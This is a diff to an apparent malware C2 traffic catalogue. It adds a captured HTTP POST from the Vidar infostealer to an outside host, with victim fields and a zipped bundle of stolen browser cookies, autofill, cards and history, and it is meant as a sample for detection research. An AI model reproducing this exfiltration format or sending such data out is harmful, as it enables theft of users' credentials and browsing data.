@@ -267,3 +267,87 @@ Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"
 --36775038942641984568--
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")
+
+#### Vidar Stealer
+~~~
+POST / HTTP/1.1
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
+Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
+Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
+Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
+Content-Length: 111609
+Host: weimachel.net
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="hwid"
+
+eeeb5d54-7880-42a7-b542-739bbc26cf4b
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="os"
+
+Windows 7 Professional
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="platform"
+
+x64
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="profile"
+
+160
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="user"
+
+admin
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="cccount"
+
+0
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="fcount"
+
+1
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="telegram"
+
+0
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="ver"
+
+13.9
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="ccount"
+
+0
+--1BEF0A57BE110FD467A
+Content-Disposition: form-data; name="logs"; filename="CH_eeeb5d54-7880-42a7-b542-739bbc26cf4b3006040214.zip"
+Content-Type: zip
+
+PK........$.HO............#.../Autofill/Google Chrome_Default.txtUT
+.....]...]...]..PK........$.HO................/CC/Google Chrome_Default.txtUT
+.....]...]...]..PK........$.HOF..`....u...5.../Cookies/cookies_Mozilla Firefox_nltxvmn2.default.txtUT
+.....]...]...]..O..0...X.G	......QdFg..G..XI..f....?.R[{.0Unm..U.._..\.f.nEY2S.3..m..?...e........B...'.r..>......P.4..HTQ..H..#.[M..k.R...b.o..d..<$g^..Y......6i.....2.x.....c..-.w..4.....<.....C.\.0q.B.s.m..$E.
+...^.D...8..[vJ9c.:....,.J.i!......V....ii.........!.>cz....A..0..@.........Jl. 4.!.R.....".KA.r...w.IT.K).B|......<..P....8..k...y.....Z....Ji
+U}...'F.....v.wnu.;.:..a.)...BC...m.Vw.k...I.<.._.]~..0
+b..v.&Q@..LH.gSM...fAv&
+<......].	...~...{.T....)^..9^......|.=..|.hZ...*7.<h.......Ko8..~.PK........&.HO................/Cookies/Edge_Cookies.txtUT
+.....]...]...]..PK........$.HO.'.e........".../Cookies/Google Chrome_Default.txtUT
+.....]...]...]..I..P.....Sp.;t...........+..a._?.$....t.R..*U.%I3...)....M. ..x2..S.....S.b...L......d.R...piwR......<~y....AWP..G......P..?.i.....b.'|jz.......&...C.^k.7....d........
+..%..tF]..V.g...........T....
+M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......p....{.d..l....!.."...........y.....{N.P....SY.3......V~......z.=....w.o.-j.......$..i&.s]..\...?....*55.f.
+...r....#|..NW.EFR......L......fe.
+.5..Q.s+...<.... .w..j.....PK........&.HOQ.......F......./Cookies/IE_Cookies.txtUT
+.....]...]...].R.n.@.=7...[:]........ .x	`...8$......c..9...J....RRe...w.......,....	..0I.@.... .x...%.....<.].5.........PO\.F...EL..t.he.......x..h..V.c0G0.5%D...P...[m......]8.A."...Av)....J.B..|..D.Eq....8.....f&X......7....nn7.zW]..Y]d#.>O...(.~n....NM...	.".!..`Q&L08XX%....q...=......kVTy.|.lPf.....qm.....t;..~uow....k.@..9..'....i.`.........R.t.{.b......;.9..Pfb.......Tq...}%..s._N.*....	.{._PK........&.HO!...E...j......./cookie_list.txtUT
+.....]...]...]U.1
+.0..v...?..1.N...C_..C.IB.).O.(...~R..0.....L.x.(:SQ....=~\m.e...PK........$.HO............$.../Downloads/Google Chrome_Default.txtUT
+.....]...]...]..PK........0.HO................/Files/Desktop.zipUT
+.....]...]...]PK....................PK........4.HO................/Files/Users.zipUT
+.....]...]...]PK....................PK........$.HO............".../History/Google Chrome_Default.txtUT
+.....]...]...]..PK........$.HO.5..
+.......5.../History/history_Mozilla Firefox_nltxvmn2.default.txtUT
+.....]...]...]..+.......PK........0.HO..M(.....	....../information.txtUT
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
